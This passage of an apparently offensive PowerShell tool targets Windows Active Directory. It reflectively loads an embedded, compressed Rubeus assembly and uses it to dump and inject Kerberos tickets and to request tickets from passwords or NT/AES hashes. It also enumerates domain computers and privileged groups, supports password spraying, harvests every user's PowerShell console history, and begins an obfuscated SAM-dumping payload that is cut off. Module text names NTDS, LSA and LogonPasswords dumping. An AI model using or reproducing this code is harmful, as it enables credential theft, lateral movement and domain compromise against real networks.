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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [Rubeus.Program].GetMethod('Main')

    if($PrivateMethod){
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
    else{
      $PrivateMethod = [Rubeus.Program].GetMethod('Main')
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
     [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
    }
}

################################################################################################################
################################################# Function: RestoreTicket ######################################
################################################################################################################
Function RestoreTicket{
if (!$CurrentUser) {
    if ($Method -ne "GenRelayList"){
    klist purge | Out-Null
    Start-sleep -Milliseconds 100
    klist purge | Out-Null
    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            
        }
    }
}


################################################################################################################
##################################### Ticket logic for authentication ##########################################
################################################################################################################
# Set the userDomain when impersonating a user in one domain for access to an alternate domain
# Can't remember where I was going with this...
if ($UserDomain -ne ""){}

# Check if the current user is an administrator, used for ticket functions
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If CurrentUser is not set to $True, use Rubeus to store the current user's ticket
if (!$CurrentUser) {
    
    # If the method is not RDP proceed
    if ($Method -ne "RDP") {
    if ($Method -ne "MSSQL"){
        
        # If the system is domain joined, store the current user ticket into a variable to restore later
        if ($DomainJoined) {
            try {
                $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
                $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
            }
            catch {
                try {
                    if (!$CheckAdmin) {
                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                        if ($OriginalUserTicket -notlike "doI*") {
                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                            Write-Host "Unable to retrieve any Kerberos tickets"
                            return
                        }
                    }
                    elseif ($CheckAdmin) {
                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
                        $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()

                        if ($OriginalUserTicket -notlike "doI*") {
                            Write-Host "[*] " -NoNewline -ForegroundColor "Yellow"
                            Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                            return
                        }
                    }
                }
                catch {
                    Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                    Write-Host "Unable to retrieve any Kerberos tickets"
                    return
                }
            }
        }
    }

    
    if ($Method -ne "RDP"){
    # Check if ticket has been provided
    if ($Ticket -ne "") {
        if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
            $Ticket = Get-Content -Path $Ticket -Raw
        }

        $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"

        # Check if an error has occurred
        if ($ProvidedTicket -like "*/ticket:X*") {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Invalid ticket provided"
            return
        }

        # Use regular expression to extract the Username
        $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
        $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
        $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
        $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

        # Display the extracted information
        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Supplied Ticket Details"

        if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
        if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }

        Write-Host "    - UserName : $TicketUsername"
        Write-Host "    - Realm    : $TicketRealm"
        Write-Host "    - Expires  : $TicketExpiry"
        Write-Host

        # Attempt to inject the ticket into the current session
        $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
        if ($InjectTicket -like "*Error 1398*") {
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-host "Ticket expired"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
    elseif ($Password -ne "") {
        klist purge | Out-Null

        if ($UserDomain -ne "") {
            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
        } elseif ($UserDomain -eq "") {
            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
        }

        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*") {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskPassword -like "*Unhandled Rubeus exception:*") {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
    elseif ($Hash -ne "") {
        if ($Hash.Length -eq 32) {
            klist purge | Out-Null

            if ($UserDomain -ne "") {
                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"
            }
            if ($UserDomain -eq "") {
                $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
            }

            if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect hash or username"
                klist purge | Out-Null
                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                return
            }

            if ($AskRC4 -like "*Unhandled Rubeus exception:*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect hash or username"
                klist purge | Out-Null
                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                return
            }
        }
        elseif ($Hash.Length -eq 64) {
            klist purge | Out-Null

            if ($UserDomain -ne "") {
                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"
            }
            if ($UserDomain -eq "") {
                $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
            }

            if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect hash or username"
                klist purge | Out-Null
                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                return
            }

            if ($Ask256 -like "*Unhandled Rubeus exception:*") {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Incorrect hash or username"
                klist purge | Out-Null
                Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                return
            }
        }
        else {
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
            Write-Host 
            Write-Host
            return
            
                }
            }
        }
    }
}


################################################################################################################
########################################## Domain Target Acquisition ###########################################
################################################################################################################

Function Bind {
param ($Domain)
    $DirectoryEntry = [ADSI]"LDAP://$domain"

if ($DirectoryEntry.distinguishedName) {} else {
    
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Failed to bind to the domain"

    if (!$DomainJoined){
    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Ensure the credentials parameters provided are for a valid account"
    }
    continue
    
    }
}

Bind -Domain $Domain


function New-Searcher {
    $directoryEntry = [ADSI]"LDAP://$domain"
    $searcher = [System.DirectoryServices.DirectorySearcher]$directoryEntry
    $searcher.PageSize = 1000
    return $searcher
}

if ($Method -ne "Spray"){
$searcher = New-Searcher
$searcher.PropertiesToLoad.AddRange(@("dnshostname", "operatingSystem"))

if ($Targets -eq "Workstations") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -notlike "*windows*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "Servers") {

$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["operatingSystem"][0]  -like "*server*" -and $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}
elseif ($Targets -eq "DC" -or $Targets -eq "DCs" -or $Targets -eq "DomainControllers" -or $Targets -eq "Domain Controllers") {

$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll()

}
elseif ($Targets -eq "All" -or $Targets -eq "Everything") {


$searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN" }

}


elseif ($Method -ne "Spray"){
if ($Targets -is [string]) {
    $ipAddress = [System.Net.IPAddress]::TryParse($Targets, [ref]$null)
    if ($ipAddress) {
        Write-Host "IP Addresses not yet supported" -ForegroundColor "Red"
        break
    }
    else {
        
        if ($Targets -notlike "*.*") {
            $Targets = $Targets + "." + $Domain
        }
        
        $computers = $searcher.FindAll() | Where-Object { $_.Properties["dnshostname"][0] -in $Targets }
            
            }
        }
    }
}



################################################################################################################
############################ Grab interesting users for various parsing functions ##############################
################################################################################################################


# Fetch enabled users
$searcher = New-Searcher
$searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
$searcher.PropertiesToLoad.AddRange(@("samAccountName"))
$users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
$EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }

function Get-GroupMembers {
    param ([string]$GroupName)

    $searcher = New-Searcher
    $searcher.PropertiesToLoad.AddRange(@("member"))
    $searcher.Filter = "(&(objectCategory=group)(cn=$GroupName))"
    $group = $searcher.FindOne()
    $members = @()

    if ($group -ne $null -and $group.Properties["member"]) {
        foreach ($memberDN in $group.Properties["member"]) {
            $searcher.Filter = "(distinguishedName=$memberDN)"
            $searcher.PropertiesToLoad.Clear()
            $searcher.PropertiesToLoad.AddRange(@("samAccountName", "objectClass"))
            $object = $searcher.FindOne()

            if ($object -and $object.Properties["objectClass"] -contains "user") {
                $samName = $object.Properties["samAccountName"]
                if ($samName -and $samName.Count -gt 0) {
                    $members += $samName[0].ToString()
                }
            }
        }
    }

    return $members
}





$DomainAdmins = Get-GroupMembers -GroupName "Domain Admins"
$EnterpriseAdmins = Get-GroupMembers -GroupName "Enterprise Admins" -ErrorAction SilentlyContinue
$ServerOperators = Get-GroupMembers -GroupName "Server Operators" -ErrorAction SilentlyContinue
$AccountOperators = Get-GroupMembers -GroupName "Account Operators" -ErrorAction SilentlyContinue

$FQDNDomainName = $domain.ToLower()
$FQDNDomainPlusDomainAdmins = $DomainAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusEnterpriseAdmins = $EnterpriseAdmins | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusServerOperators = $ServerOperators | ForEach-Object { "$FQDNDomainName\$_" }
$FQDNDomainPlusAccountOperators = $AccountOperators | ForEach-Object { "$FQDNDomainName\$_" }

if ($Method -eq "Spray") {
    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users") {
        $Targets = $EnabledDomainUsers
    }
    elseif ($Targets -in $EnabledDomainUsers) {
        $EnabledDomainUsers = $Targets
    }
    else {
        $groupMembers = Get-GroupMembers -GroupName $Targets
        if ($groupMembers.Count -gt 0) {
            $EnabledDomainUsers = $groupMembers
        }
        elseif ($groupMembers.Count -eq 0) {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-host "Group either does not exist or is empty"
            return
        }
        else {
            Write-host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Unspecified Error"
            return
        }
    }
}


# Grab Computer Accounts for spraying
function Get-ComputerAccounts {
    $searcher = New-Searcher
    $searcher.Filter = "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    
    try {
        $ComputerSamAccounts = $searcher.FindAll() | ForEach-Object { $_.Properties["samAccountName"][0] }
        return $ComputerSamAccounts
    } catch {
        Write-Error "Failed to fetch computer accounts. Error: $_"
        return $null
    }
}

$ComputerSamAccounts = Get-ComputerAccounts


if (!$LocalAuth){
if ($Method -ne "RDP"){
if (!$Force){
foreach ($EnterpriseAdmin in $EnterpriseAdmins){
        $splitResult = $Username -split [regex]::Escape($EnterpriseAdmin)
        if ($splitResult.Count -gt 1) {
        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Specified user is a Enterprise Admin. Use the -Force switch to override"
        RestoreTicket
        return
        }
    }
}

if (!$Force) {
    foreach ($DomainAdmin in $DomainAdmins) {
        $splitResult = $Username -split [regex]::Escape($DomainAdmin)
        if ($splitResult.Count -gt 1) {
            Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Specified user is a Domain Admin. Use the -Force switch to override"
            RestoreTicket
            return
            }
        }
    }
}

if (!$CurrentUser) {
    if ($Method -ne "GenRelayList") {
        if ($Method -ne "SessionHunter"){
         if ($Method -ne "Spray"){
        try {
            $searcher = New-Searcher
            $searcher.Filter = "(&(objectCategory=user)(samAccountName=$Username))"
            $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
            $user = $searcher.FindOne()
            $domainUser = $user.Properties["samAccountName"]
        }
        Catch {
           
           if ($Ticket -ne $null){} 
            elseif (!$DomainUser) {
                Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Specified username is not a valid domain user"
                return
                
                        }
                    }
                }
            }
        }
    }
}




################################################################################################################
################################## Information based on selected module ########################################
################################################################################################################

if ($Method -eq "SessionHunter"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Searching for systems where privileged users' credentials might be in running memory"
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Filtering by those for which we have admin rights"
    Write-Host
    Start-Sleep -Seconds 3
}

$moduleMessages = @{
    "KerbDump"         = "Tickets will be written to $KerbDump"
    "Tickets"          = "Tickets will be written to $MimiTickets"
    "LSA"              = "LSA output will be written to $LSA"
    "ekeys"            = "eKeys output will be written to $ekeys"
    "SAM"              = "SAM output will be written to $SAM"
    "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
    "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
    "Files"            = "File output will be written to $UserFiles"
    "NTDS"             = "NTDS output will be written to $NTDS"
}

if ($moduleMessages.ContainsKey($Module)) {
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host $moduleMessages[$Module]
    
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to display results in the console"
        ""
    }
}
elseif ($Method -eq "GenRelayList"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SMB Signing output will be written to $SMB"
}


################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

$ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@



$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@



# Compressed to help keep under the character limit for console execution

$LocalSAM = @'
Write-Output "" ; function DumpSAM{$gz="H4sIAAAAAAAEAL1Ze3ObSBL/f6v2O3AcSSAGiqdApqiLLNmObu3YGznZupNZLxIjiwiBwsOWoui7X89DWLJlJ5u4zumfgJnunp5HPyCjKh2WcZZynWo667VOl8Jhnmd5izSe52iEcpQOEedzfC9OUFomi3aWlnFaIf7XX8p8sXy57N9kcRT04+msWBTqbZyaRrBaDcNyOF62oki5WMwQR347aBSnMRmPr4o4veZ6i6JEU2/zQX1fwQBTpHbTEuXZrI
fym3iICi8Np6iYhWANHWo5qwZJPOSGSVgUHBl32e8kSXc6y/JS/IufoDxFiWmoUZL8xcs9VJ6ERUkm6Jd5haSAaSjKsIQLmsOAKTfIsoRrJ1mB3oZplCARDDkvc25MHyXvOQZhOs9mCJY5g+kVYhWnJTejD60h/pWJKYNuOkZ5XNLh5Q2ubnTPmDC6CWfxj814w5SLbILS9bRZGxudGNlBRZyjiBmZVeV6OkRw5zL9jGWdagY9YYmI+sN5vSGH87iA
s3hN2qlp0e22cYw1mRGeVlnm8aAqUUG5wTyUF1ka4jN5gm5QQtsJMz6xm5Objd+hW9LzjHO7swCdZNfXKDpLPxQor6f43OO9h0nm5UXWQ8lIlLzVil/9+stoHQW6rd6y357C9pUHcRrB0oqgLMzDqdg/xxcEmsRT2OCwzPKFL+Dh5POsIE7ta1LQL4Z5PCsHSTacBAI7O/KGcM2sA3M2+ISGZT8IhFZ+XU0hvpzAjkqeEPrH5z1OeQdCHA+unWTXWc
p/BauBn1OO4rwoOZ1TDuczMAaGgVUsF1w38uKRKAoDfzsc7e9vOpo2tzRNprb3YaGBQQgliVPQZ65PFx4k/gvBR1oKQ7//SEBST8O8GIcJ8B7TLfgDD0b2QZRWQuRvK8OmKWlWck/YRj1PGMjaXDuU+xCAAyGSfsqM0fea8cDNhAibYWjkT97WQnrwj86sHP2UlTiTPGbXYy7yk0O+5NbHk3uzefpWkKPCJHncnm0X+hkTVqt7ORTy63T+DCn0Alz+
7yZVMvY3c+q3Yo/cHoc5tPrsqraqMnskIOFI+x5d4+P/G1psxHV4kguI1GB+UQ3wE2atkrMZnnhBnopwyiL9ZoweT96jokrKvxkxf8Dq3yuUL7rpKAPzasMnYGqPGH5QxUmEcOJp46WUwUeIZDIbDmgLfQJzYSvYJBhDj8y52GwanIZz2nwCme5eB9F3r/1jmFTogQrSioPqDi2k7357Dw0rKD0WsNQkrmf5XUYd0QMN3egCjtbzJCm2uqT82lxZuH
+QrY7fnZy/XR63uxz/9reT032oXy8xOtk0jNPiEkqADI79JY4WBf/1X0vhSj3vtcewMySxKFPsYBz/Z19Tmi3lKFi6K4FffX2xFELkbzN7wo0vgg8rXfCmOt98x7iXoItnmeyjpH70ICD/TUVr8SNJPfKE+dBXPmVxKr5c8v/u8DLfm6BbHa7HB8fw2wnLkMdTyKodgX8rwuBQtuF92tylod4Anf/pXRyeXrarHOr/Epf8eZbAHl6y28uTIrwUrnic
